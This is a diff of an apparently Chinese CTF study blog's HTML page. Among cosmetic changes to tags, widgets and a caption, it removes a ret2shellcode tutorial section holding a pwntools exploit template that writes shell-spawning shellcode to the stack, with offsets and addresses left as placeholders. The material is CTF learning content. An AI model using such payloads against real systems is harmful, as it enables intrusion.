@@ -146,7 +146,7 @@
 			</div>
 			
 				
-				<p style="font-size: 12px;">博主超喜欢的歌手的歌，请尽情的欣赏它吧！<p>
+				<p style="font-size: 12px;">博主超喜欢的歌手<p>
 			
 		
 
@@ -367,14 +367,7 @@
   <div class="article-entry" itemprop="articleBody">
  
 
-	
-		<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>程序中没有shell，需要我们自己写一个shell进去</p>
-<h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>ret2shellcode需要我们控制程序执行shellcode代码。即shellcode目标就是在栈上写入我们布局好的shellcode，利用ret-address返回shellcode执行我们的shellcode代码</p>
-<p><em><strong>前提</strong></em>：没有开启NX保护</p>
-<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust((0x... + 0x...) , <span class="string">b&#x27;a&#x27;</span>) + p64(0x.....)</span><br><span class="line"><span class="comment"># p.sendline(shellcode)</span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27; * (0x.. + 0x..) + p64(0x.....)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h3><p>暂时没有典型例子</p>
-
+			<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>程序中没有shell，需要我们自己写一个shell进去</p>
 	
 
 
@@ -1307,6 +1300,10 @@
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">-XSS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">伪协议</a>
               </li>
              
@@ -1316,10 +1313,6 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">-XSS</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1339,11 +1332,11 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+                <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">SSTI</a>
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1507,7 +1500,7 @@
 <script type="text/javascript" src="/plugins/activate-power-mode/activate-power-mode.js"></script>
 <script>
   POWERMODE.colorful = true; // make power mode colorful
-  POWERMODE.shake = true; // turn off shake
+  POWERMODE.shake = false; // turn off shake
   document.body.addEventListener('input', POWERMODE);
 </script>
 
@@ -1526,6 +1519,6 @@
     });
   </script>
   
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</body>
 
 </html>
